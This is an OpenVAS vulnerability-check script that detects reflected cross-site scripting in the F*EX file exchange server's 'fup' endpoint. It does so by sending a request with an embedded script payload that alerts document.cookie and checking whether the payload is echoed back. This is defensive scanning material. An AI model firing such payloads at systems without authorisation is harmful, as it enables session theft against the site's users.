###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_fex_fup_mult_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# F*EX (Frams's Fast File EXchange) Multiple XSS Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "Frams' Fast File EXchange versions before 20111129-2";
tag_insight = "The inputs passed via 'to','from' and 'id' parameter to 'fup' is not
  properly validated, which allows attackers to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.";
tag_solution = "Upgrade to Frams' Fast File EXchange version 20111129-2 or later
  For updates refer to http://fex.rus.uni-stuttgart.de/index.html";
tag_summary = "This host is running F*EX (Frams's Fast File EXchange) and is
  prone to multiple cross site scripting vulnerabilities.";

if(description)
{
  script_id(803034);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-0869", "CVE-2012-1293");
  script_bugtraq_id(52085);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-09-27 16:41:55 +0530 (Thu, 27 Sep 2012)");
  script_name("F*EX (Frams's Fast File EXchange) Multiple XSS Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/79420");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47971");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/48066");
  script_xref(name : "URL" , value : "http://seclists.org/oss-sec/2012/q1/att-441/FEX_20100208.txt");
  script_xref(name : "URL" , value : "http://seclists.org/oss-sec/2012/q1/att-441/FEX_20111129-2.txt");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2012-02/0112.html");

  script_description(desc);
  script_summary("Check if F*EX is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_require_ports("Services/www", 8888);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port =0;
url = "";
banner = "";

## Get HTTP Port
port = get_http_port(default:8888);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Get the banner and confirm application
banner = get_http_banner(port:port);
if(!banner || "Server: fexsrv" >!< banner){
  exit(0);
}

## Construct the Attack Request
url = '/fup?id=38c66"><script>alert(document.cookie);</script>'+
      'b08f61c45c6&to=%0d&from=%0d';

## Try attack and check the response to confirm vulnerability.
if(http_vuln_check(port:port, url:url, check_header:TRUE,
                   pattern:"<script>alert\(document.cookie\);</script>",
                   extra_check: make_list('F*EX upload<', 'F*EX server'))){
  security_warning(port);
}
